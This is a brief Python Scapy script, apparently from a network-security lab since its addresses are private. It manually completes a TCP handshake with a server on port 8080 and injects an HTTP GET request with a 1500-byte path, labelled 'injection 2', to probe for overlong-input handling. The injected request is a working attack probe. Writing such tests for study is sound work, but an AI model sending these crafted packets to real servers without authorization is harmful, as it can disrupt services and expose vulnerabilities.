from scapy.all import IP, TCP, send, sr1

ip_cliente = "172.16.30.103"
ip_servidor = "172.16.30.64"
puerto_servidor = 8080
puerto_cliente = 12345 


ip = IP(src=ip_cliente, dst=ip_servidor)
SYN = TCP(sport=puerto_cliente, dport=puerto_servidor, flags="S", seq=1000)
SYN_ACK = sr1(ip/SYN)  
ACK = TCP(sport=puerto_cliente, dport=puerto_servidor, flags="A", seq=SYN.seq + 1, ack=SYN_ACK.seq + 1)
send(ip/ACK)  


long_path = b"/" + b"G" * 1500
payload = b"GET " + long_path + b" HTTP/1.1\r\nHost: 172.16.30.64\r\n\r\n"

send(ip/TCP(sport=puerto_cliente, dport=puerto_servidor, flags="PA", seq=ACK.seq, ack=ACK.ack)/payload)

print("Inyección 2 enviada: petición con path largo.")
